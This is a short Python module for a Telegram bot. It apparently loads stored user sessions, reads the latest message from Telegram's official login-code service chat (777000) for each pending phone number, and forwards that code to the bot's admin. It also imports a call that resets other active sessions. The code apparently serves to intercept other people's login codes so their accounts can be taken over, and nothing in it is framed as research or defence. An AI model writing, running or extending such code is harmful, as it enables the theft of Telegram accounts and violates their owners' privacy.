import asyncio
from pyrogram import Client
from pyrogram.raw.functions.auth import ResetAuthorizations
from tgbot.services.Session import ImportSession


async def update_sign_in(bot):
	config = bot.config
	data = bot.config.data
	admin = bot.config.admin
	while True:
		await asyncio.sleep(5)
		try:
			for i in data._sign_in.keys():
				user = data._sign_in[i]
				
				client = ImportSession().inject(user['phone'])
				await client.client.connect()

				code = ''
				count = 0
				async for message in client.client.get_chat_history(777000):
					if count == 0:
						code = message.text
					count += 1

				if count > user['count']:
					await bot.send_message(admin, code)
					await data.del_sign_in(user['phone'])

				await client.client.disconnect()
		except:
			pass